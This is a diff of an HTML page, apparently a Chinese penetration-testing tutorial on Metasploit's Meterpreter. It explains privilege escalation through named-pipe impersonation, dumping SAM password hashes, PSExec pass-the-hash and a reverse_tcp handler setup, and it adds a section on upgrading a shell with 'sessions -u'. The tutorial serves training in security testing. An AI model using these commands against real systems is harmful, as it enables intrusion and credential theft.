@@ -47,7 +47,6 @@ Screenshot saved to: /root/tjteQinp.jpeg</code></pre><p>在根目录下看到<co
 <li>③Windows服务已启动，导致与命名管道建立连接。</li>
 <li>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为系统用户创建模拟令牌。然后用新收集的系统模拟令牌产生的cmd.exe，并且我们有一个SYSTEM特权进程</li>
 </ul>
-<p>通过内置模块</p>
 <h3 id="0x05-获取系统密码哈希值"><a href="#0x05-获取系统密码哈希值" class="headerlink" title="0x05 获取系统密码哈希值"></a>0x05 获取系统密码哈希值</h3><p>获取系统密码哈希值的副本可以帮助我们实施哈希值传递攻击，或是进行哈希值暴力破解还原明文密码，可以使用<code>run post/windows/gather/smart_hashdump</code>命令<br>从<code>SAM</code>导出密码哈希,主要执行时需要<code>SYSTEM</code>权限</p>
 <p><img src="/2020/02/18/metasploit之meterpreter/8.png" alt></p>
 <h4 id="PSExec哈希传递"><a href="#PSExec哈希传递" class="headerlink" title="PSExec哈希传递"></a>PSExec哈希传递</h4><p>在上一步中我们已经获取到用户哈希后，当我们不能短时间将明文密码破解出来，而这个时侯我们又想通过已经获取到的哈希值入侵更多的系统，可以利用<code>windows/smb/psexec</code>模块进行哈希传递攻击,注意这里有两点前提:①打开445端口smb服务；②打开admin $共享</p>
@@ -59,7 +58,10 @@ Screenshot saved to: /root/tjteQinp.jpeg</code></pre><p>在根目录下看到<co
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.196.193</span><br><span class="line">msf &gt; set LPORT 4444</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/02/18/metasploit之meterpreter/7.png" alt></p>
-<h3 id="将命令行shell升级为meterpreterses"><a href="#将命令行shell升级为meterpreterses" class="headerlink" title="将命令行shell升级为meterpreterses"></a>将命令行shell升级为meterpreterses</h3><h3 id="0x07-Meterpreter速查命令"><a href="#0x07-Meterpreter速查命令" class="headerlink" title="0x07 Meterpreter速查命令"></a>0x07 Meterpreter速查命令</h3><p><code>help</code>: 打开Meterpreter使用帮助</p>
+<h3 id="将命令行shell升级为meterpreterses"><a href="#将命令行shell升级为meterpreterses" class="headerlink" title="将命令行shell升级为meterpreterses"></a>将命令行shell升级为meterpreterses</h3><p>Metasploit框架中的一个功能可以在系统被攻陷的时候使用<code>sessions -u</code>将命令行<code>shell</code>升级为<code>meterpreter</code>，演示如下</p>
+<p><img src="/2020/02/18/metasploit之meterpreter/9.png" alt></p>
+<p>我们先获取的<code>shell cmd/unix</code>基于命令行的shell，然后使用<code>sessions -u</code>命令并指定<code>Id</code>就将命令行<code>shell</code>升级为<code>meterpreter</code></p>
+<h3 id="0x07-Meterpreter速查命令"><a href="#0x07-Meterpreter速查命令" class="headerlink" title="0x07 Meterpreter速查命令"></a>0x07 Meterpreter速查命令</h3><p><code>help</code>: 打开Meterpreter使用帮助</p>
 <p><code>run scriptname</code>: 运行Meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名</p>
 <p><code>sysinfo</code>: 列出受控主机的系统信息</p>
 <p><code>ls</code>: 列出目标主机的文件和文件夹信息</p>
